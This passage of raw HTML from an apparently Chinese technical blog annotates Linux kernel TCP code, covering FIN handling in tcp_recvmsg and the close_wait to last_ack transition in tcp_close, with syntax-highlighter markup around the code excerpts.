*seq - TCP_SKB_CB(skb)-&gt;seq;\r\n\t\t\t// syn处理 \r\n\t\t\tif (tcp_hdr(skb)-&gt;syn)\r\n\t\t\t\toffset--;\r\n\t\t\t// 此处判断表示，当前skb还有数据可读，跳转found_ok_skb\r\n\t\t\tif (offset &lt; skb-&gt;len)\r\n\t\t\t\tgoto found_ok_skb;\r\n\t\t\t// 处理fin包的情况\t\r\n\t\t\t// offset == skb-&gt;len,跳转到found_fin_ok然后跳出外面的大循环\r\n\t\t\t// 并返回0\r\n\t\t\tif (tcp_hdr(skb)-&gt;fin)\r\n\t\t\t\tgoto found_fin_ok;\r\n\t\t\tBUG_TRAP(flags &amp; MSG_PEEK);\r\n\t\t\tskb = skb-&gt;next;\r\n\t\t} while (skb != (struct sk_buff *)&amp;sk-&gt;sk_receive_queue);\r\n\t\t......\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f968637213162-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f968637213162-28\">28</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-1\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-2\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 从接收队列里面获取一个sk_buffer</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">skb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">skb_peek</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sk_receive_queue</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">do</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-5\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 如果已经没有数据，直接跳出读取循环，返回0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-6\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-7\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-8\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-9\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// *seq表示已经读到多少seq</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-10\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// TCP_SKB_CB(skb)-&gt;seq表示当前sk_buffer的起始seq</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-11\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// offset即是在当前sk_buffer中已经读取的长度</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-12\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">seq</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TCP_SKB_CB</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">seq</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-13\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// syn处理 </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-14\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">tcp_hdr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">syn</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-15\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-v\">offset</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-16\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 此处判断表示，当前skb还有数据可读，跳转found_ok_skb</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-17\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">skb</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-18\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">goto</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found_ok_skb</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-19\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 处理fin包的情况\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-20\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// offset == skb-&gt;len,跳转到found_fin_ok然后跳出外面的大循环</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-21\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 并返回0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-22\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">tcp_hdr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">fin</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-23\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">goto</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found_fin_ok</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-24\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">BUG_TRAP</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">flags</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MSG_PEEK</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-25\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">skb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">skb</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-26\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">skb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sk_buff *</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sk_receive_queue</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f968637213162-27\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f968637213162-28\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0039 seconds] -->\r\n<p>上面代码的处理过程如下图所示: <img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/076b279990cf1889c3eff648b6d53597.png\" alt=\"输入图片说明\"><br>\n我们看下tcp_recmsg的第二段:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f96c353658041\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfound_ok_skb:\r\n\t\t// tcp已读seq更新\r\n\t\t*seq += used;\r\n\t\t// 这次读取的数量更新\r\n\t\tcopied += used;\r\n\t\t// 如果还没有读到当前sk_buffer的尽头，则不检测fin标识\r\n\t\tif (used + offset &lt; skb-&gt;len)\r\n\t\t\tcontinue;\r\n\t\t// 如果发现当前skb有fin标识，去found_fin_ok\r\n\t\tif (tcp_hdr(skb)-&gt;fin)\r\n\t\t\tgoto found_fin_ok;\r\n\t\t......\r\nfound_fin_ok:\r\n\t\t/* Process the FIN. */\r\n\t\t// tcp已读seq++\r\n\t\t++*seq;\r\n\t\t...\r\n\t\tbreak;\r\n} while(len &gt; 0);\t\t\t\t\t\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96c353658041-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96c353658041-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-1\"><span class=\"crayon-v\">found_ok_skb</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-2\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// tcp已读seq更新</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">seq</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 这次读取的数量更新</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">copied</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-6\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 如果还没有读到当前sk_buffer的尽头，则不检测fin标识</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-7\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">used</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">skb</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-8\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-9\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 如果发现当前skb有fin标识，去found_fin_ok</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-10\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">tcp_hdr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">fin</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-11\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">goto</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found_fin_ok</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-12\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-13\"><span class=\"crayon-v\">found_fin_ok</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-14\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">/* Process the FIN. */</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-15\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// tcp已读seq++</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-16\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-o\">++</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">seq</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-17\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-18\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96c353658041-19\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">len</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">\t\t\t\t\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96c353658041-20\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>由上面代码可知，一旦当前skb读完了而且携带有fin标识，则不管有没有读到用户期望的字节数量都会返回已读到的字节数。下一次再读取的时候则在刚才描述的tcp_rcvmsg上半段直接不读取任何数据再跳转到found_fin_ok并返回0。这样应用就能感知到对端已经关闭了。 如下图所示:<br>\n<img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/33252958e68904ed65bbe554fb2075a1.png\" alt=\"输入图片说明\"></p>\n<h3>last_ack</h3>\n<p>应用层在发现对端关闭之后已经是close_wait状态，这时候再调用close的话，会将状态改为last_ack状态，并发送本端的fin,如下代码所示:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f96f184713636\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvoid tcp_close(struct sock *sk, long timeout)\r\n{\r\n\t......\r\n\telse if (tcp_close_state(sk)){\r\n\t\t// tcp_close_state会将sk从close_wait状态变为last_ack\r\n\t\t// 发送fin包\r\n\t\ttcp_send_fin(sk);\r\n\t}\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96f184713636-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96f184713636-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96f184713636-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96f184713636-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96f184713636-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96f184713636-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96f184713636-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96f184713636-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f96f184713636-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f96f184713636-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f96f184713636-1\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96f184713636-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96f184713636-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96f184713636-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">tcp_close_state</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96f184713636-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// tcp_close_state会将sk从close_wait状态变为last_ack</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96f184713636-6\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 发送fin包</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96f184713636-7\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">tcp_send_fin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span 